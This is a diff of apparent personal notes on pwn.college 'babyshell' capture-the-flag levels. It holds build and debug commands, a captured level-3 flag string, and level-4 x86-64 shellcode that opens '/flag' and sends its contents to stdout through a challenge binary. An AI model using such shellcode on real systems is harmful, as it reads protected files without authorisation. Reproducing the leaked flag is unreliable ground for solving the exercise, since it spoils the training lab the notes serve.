@@ -32,6 +32,11 @@ step 4: cat shellcode-raw | /challenge/babyshell_level2
 Optional step:-type: strace ./shellcode-elf
         -shows you what is happening in the high-level inside your code.
 Optional step:
+      1st type=gcc -nostdlib -static shellcode.s -o shellcode-elf
+      2nd type=./shellcode-elf
+      3rd type=objdump -M intel -d shellcode-elf
+      ---shows u the memory address of each command
+
 
  
 
@@ -266,4 +271,36 @@ asm -c amd64 "movabs  rbx, 0x11111167616c662f
     shl     rax, 0x38
     shr     rax, 0x38
     syscall" | /challenge/babyshell_level3
+    
+    
+    flag=pwn.college{g5dVQ9pExiIQsNVaJm870xthS8t.QX5EjMsADOzQzW}
+    
+              level 4
+    
+asm -c amd64 "
+   mov r10, 0x00000067616c662f
+   push r10
+   pop rdi
+   push 2
+   pop rax
+   push 0
+   pop rsi
+   syscall
 
+   push 1
+   pop rdi
+   push rax
+   pop rsi
+   push 0
+   pop rdx
+   mov r10, 0x28
+   push r10
+   pop rax
+   mov r10, 1000
+   syscall
+
+   mov r9, 0x3c
+   push r9
+   pop rax
+   syscall
+" | /challenge/babyshell_level4
